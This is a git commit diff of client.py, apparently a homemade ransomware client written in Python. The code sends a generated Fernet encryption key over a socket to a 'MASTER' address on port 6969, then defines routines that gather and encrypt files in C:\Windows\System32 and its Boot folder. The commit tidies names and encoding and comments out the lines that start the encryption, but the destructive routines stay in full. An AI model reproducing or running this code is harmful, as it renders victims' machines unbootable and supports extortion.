c8f478f9282599f1f70f5a6de5175b16e78e1bc1
Tarmica <lilskyforever@gmail.com>
2022-12-08 08:10:39 +0200

    Back at it

--- client.py
+++ client.py
@@ -3,8 +3,9 @@ from cryptography.fernet import Fernet
 import socket
 import multiprocessing as mp
 
-
-MASTER = "ENTER MASTER IP ADDRESS"
+#################################################### enter master ip address here ############################################################################
+MASTER = ''
+##############################################################################################################################################
 PORT = 6969
 ADDR = (MASTER, PORT)
 FORMAT = "utf-8"
@@ -20,7 +21,7 @@ with open("thekey.key", "wb") as thekey:
 
 #sending key to master
 def send(msg):
-    message = msg
+    message = bytes(msg, 'utf-8')
     msg_length = len(message)
     send_length = str(msg_length).encode(FORMAT)
     send_length += b' ' * (HEADER - len(send_length))
@@ -31,7 +32,8 @@ def send(msg):
 #finally...going for the kill
 def first_injection():
     files = []
-    def kill_system32():
+    def add_system32():
+        '''add system 32 into the list of directories to be encrypted'''
         try:
             os.chdir("C:\Windows\System32")
         except LookupError as e:
@@ -42,7 +44,10 @@ def first_injection():
                 continue
             files.append(_)
             
-    kill_system32()
+    add_system32()
+    
+    '''finally encrypting it'''
+    
     for _ in files:
         with open(_, "rb") as thefile:
             contents = thefile.read()
@@ -56,8 +61,10 @@ def second_injection():
     except LookupError as e:
         os.chdir("D:\Windows\System32")
     boot_files = []
-    #first add boot files into a list
-    def add_bootfiles_in_kill_queue():
+    
+    '''first add boot files into a list'''
+    
+    def add_bootfiles():
         try:
             os.chdir("C:\Windows\System32\Boot")
         except LookupError as e:
@@ -72,9 +79,9 @@ def second_injection():
         except:
             pass
             
-    add_bootfiles_in_kill_queue()
+    add_bootfiles()
     
-    #secondly, encrypt bootfiles
+    '''secondly, encrypt bootfiles'''
     for _ in boot_files:
         with open(_, "rb") as afile:
             bcontents = afile.read()
@@ -86,13 +93,13 @@ def second_injection():
                 
 if __name__ == '__main__':
     send(key_string + "#####THAT IS THE KEY")
-    send(key + "######THAT IS THE KEY")
+    send(key + bytes("######THAT IS THE KEY", 'utf-8'))
     i = mp.Process(target=send, args=key_string)
     i_0 = mp.Process(target=send, args=key)
-    i_1 = mp.Process(target=first_injection)
-    i_2 = mp.Process(target=second_injection)
-    i_1.start()
-    i_2.start()
-    i_1.join()
-    i_2.join()
+    #i_1 = mp.Process(target=first_injection)
+    #i_2 = mp.Process(target=second_injection)
+    #i_1.start()
+    #i_2.start()
+    #i_1.join()
+    #i_2.join()
     
